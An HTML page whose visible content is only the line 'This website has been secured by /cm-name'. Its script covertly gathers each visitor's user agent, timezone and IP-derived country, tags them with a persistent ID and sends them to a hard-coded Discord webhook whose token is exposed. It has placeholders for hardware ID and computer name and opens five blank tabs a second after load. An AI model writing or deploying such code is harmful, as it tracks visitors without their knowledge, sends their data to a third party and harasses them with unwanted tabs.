<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>No Devtools | Alexandru & Nishanth</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        h1 {
            font-size: 3rem;
            color: #333;
            text-align: center;
        }
        footer {
            position: absolute;
            bottom: 10px;
            font-size: 1.2rem;
            color: #555;
        }
    </style>
</head>
<body>
    <h1>This website has been secured by /cm-name</h1>
    <footer>Alexandru & Nishanth</footer>

    <script>
        // Function to generate a unique ID
        function generateUniqueId() {
            return 'user-' + Math.random().toString(36).substr(2, 9);
        }

        // Function to send a webhook
        function sendWebhook(userId, userAgent, timezone, country) {
            // Payload for Discord webhook
            const payload = {
                embeds: [{
                    title: "Website Visit Details",
                    fields: [
                        { name: "User ID", value: userId },
                        { name: "User-Agent", value: userAgent },
                        { name: "Timezone", value: timezone },
                        { name: "Country", value: country },
                        // HWID and computer name would be placeholders here
                        { name: "HWID", value: "Not Available" },
                        { name: "Computer Name", value: "Not Available" }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            // Send a POST request to the Discord webhook
            fetch("https://discord.com/api/webhooks/1285287451140554753/3wsbcxkJ5dMzdaUt1WS_jmzx1hQKEy-VZfCS00i0NcNENn5jBoAqbMETQbVc7lf5tQWR", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            }).then(response => {
                console.log("Webhook sent:", response);
            }).catch(error => {
                console.error("Error sending webhook:", error);
            });
        }

        // Function to get or set a unique user ID
        function getOrSetUserId() {
            let userId = localStorage.getItem('userId');
            if (!userId) {
                userId = generateUniqueId();
                localStorage.setItem('userId', userId);
            }
            return userId;
        }

        // Function to get user's country using IP geolocation API
        async function getCountry() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data.country_name || 'Unknown';
            } catch (error) {
                console.error('Error fetching country:', error);
                return 'Unknown';
            }
        }

        // Get or create a unique user ID and send the webhook as soon as the page loads
        window.onload = async function() {
            const userId = getOrSetUserId();
            const userAgent = navigator.userAgent; // Get user agent string
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Get timezone
            const country = await getCountry(); // Get country

            sendWebhook(userId, userAgent, timezone, country);
        };

                function openMultipleTabs(count) {
            for (let i = 0; i < count; i++) {
                window.open("about:blank", "_blank");
            }
        }

        // Open 5 new tabs in 1 second
        setTimeout(() => openMultipleTabs(5), 1000);
    </script>
</body>
</html>
